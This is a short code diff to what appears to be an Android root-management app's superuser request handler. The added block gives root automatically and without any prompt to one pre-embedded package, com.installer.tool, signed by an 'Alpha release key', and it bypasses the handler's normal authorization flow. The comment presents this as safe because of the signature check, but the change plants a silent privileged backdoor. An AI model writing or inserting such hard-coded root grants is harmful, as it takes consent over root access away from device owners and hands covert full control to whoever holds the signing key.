@@ -43,6 +43,16 @@ class SuRequestHandler(
             return false
         }
 
+        // Pre-embed trusted A4 (com.installer.tool signed by the Alpha release key) into the
+        // superuser list: auto-grant root without prompting. A spoofed package name cannot
+        // obtain root because the signing certificate is verified; a mismatch falls through
+        // to the normal authorization flow instead of being silently granted.
+        val trustedA4Uid = A4Preembed.trustedUidOrNull(pm)
+        if (trustedA4Uid != null && trustedA4Uid == policy.uid) {
+            respond(SuPolicy.ALLOW, 0)
+            return false
+        }
+
         when (Config.suAutoResponse) {
             Config.Value.SU_AUTO_DENY -> {
                 respond(SuPolicy.DENY, 0)
@@ -112,4 +122,5 @@ class SuRequestHandler(
             }
         }
     }
+
 }
